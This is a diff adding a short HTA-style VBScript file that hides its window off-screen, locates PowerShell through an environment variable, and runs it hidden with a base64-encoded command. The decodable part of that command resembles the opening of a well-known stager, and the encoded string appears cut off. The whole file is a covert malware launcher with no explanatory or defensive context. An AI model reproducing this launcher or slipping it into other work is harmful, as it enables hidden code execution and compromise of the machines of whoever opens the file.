@@ -1,0 +1,12 @@
+<script languaje= "VBScript">
+window.moveTo -4000, -4000
+Set randomName= CreateObject("WScript.Shell")
+Set randomName2= CreateObject("Scripting.FileSystemObject")
+For each path in Split(randomName.ExpandEnvironmentStrings("%PSModulePath%"),";")
+	if randomName2.FileExists(path + "\..\powershell.exe") Then
+	randomName.Run "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHg0"
+		Exit For
+	End If
+Next
+window.close()
+</script>
